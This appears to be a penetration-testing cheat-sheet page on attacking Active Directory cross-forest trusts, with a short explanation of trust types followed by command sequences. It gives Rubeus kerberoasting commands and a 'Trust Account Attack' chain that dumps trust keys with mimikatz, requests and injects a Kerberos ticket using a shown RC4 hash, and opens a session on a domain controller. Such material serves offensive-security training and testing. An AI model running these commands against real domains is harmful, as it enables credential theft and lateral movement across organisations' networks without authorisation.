# Cross Forest Attacks

In **Active Directory (AD)**, a **trust** is a connection between the authentication systems of two domains, allowing users from one domain to access resources in another. Trusts exist both **within a single AD forest** and **between separate forests (cross-forest trusts).** There are many ways to attack cross-forest trusts.

{% hint style="info" %}
**Types of Cross-Forest Trusts**

1. **External Trust**: Connects 2 separate domains in different hosts, that do not have a forest trust, and uses SID filtering to prevent SID History abuse.
2. **Forest Trust**: Connects 2 entire entire AD forest allowing users from one forest to authenticate across all domains in the other forest. If **Domain A trusts Forest X**, then **any user from Forest X** can access **any domain in Forest A**.
{% endhint %}

<table><thead><tr><th width="213"></th><th>One-Way Trust</th><th>Two-Way Trust</th></tr></thead><tbody><tr><td>Direction of Access</td><td>Trusted → Trusting</td><td><strong>Both ways</strong> (Bidirectional)</td></tr><tr><td>Who Can Access What?</td><td>Users in the <strong>trusted domain</strong> can access the <strong>trusting domain</strong>, but <strong>not vice versa</strong>.</td><td>Users from <strong>both domains/forests</strong> can access each other's resources.</td></tr><tr><td>Common Use Case</td><td>A <strong>parent company</strong> allows employees from a <strong>subsidiary</strong> to access shared resources, but <strong>not the other way around</strong>.</td><td><strong>Common in large organizations</strong> where domains need to share resources freely.</td></tr><tr><td>Security Risk</td><td><strong>Lower risk</strong>, as access is limited to one direction.</td><td><strong>Higher risk</strong>, since a <strong>compromise in one domain/forest</strong> can affect the other.</td></tr></tbody></table>

#### **In a nutshell**

* AD **trusts** allow users in different domains/forests to access resources.
* **External Trusts** are **more restrictive** and use **SID Filtering**.
* **Forest Trusts** are **more flexible but riskier** because they allow **full authentication across forests**.
* **One-Way Trusts** allow access in only **one direction**, while **Two-Way Trusts** allow access in **both directions**.
* Attackers can **abuse trust relationships** if security is not properly configured.

### <mark style="color:yellow;">Kerberoasting targeting a Domain</mark>

```powershell-session
.\Rubeus.exe kerberoast /domain:logistics.ad /user:holly
```

### <mark style="color:yellow;">Trust Account Attack</mark>

In above example we see a one-way trust from Forest A to Forest B, the access works from A to B but not the other way around. To brake this rule we can perform a Trust Account Attack. &#x20;

{% hint style="info" %}
When a trust is created, a **trust account (A$) is automatically created in Forest-B**. This account is just a **regular domain user** in Forest-B. Attackers in **Forest-A** can **steal the credentials** of this trust then login to **Forest-B** bypassing one-way restriction.
{% endhint %}

```powershell
# Enumerate
Get-ADTrust -Identity megacorp.ad  

# SharpHound domain
.\SharpHound.exe -c All -d megacorp.ad

# Extract Forest Trust Keys
.\mimikatz.exe "lsadump::trust /patch" exit

# Request ticket for logistics$
.\Rubeus.exe asktgt /user:logistics$ /domain:megacorp.ad /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt

# Kerberoast
.\Rubeus.exe kerberoast /domain:megacorp.ad

# Or request a ticket
.\Rubeus.exe asktgt /user:white.beard /password:<SNIP> /domain:megacorp.ad /ptt  

# New PS Session
New-PSSession DC03.megacorp.ad  
```

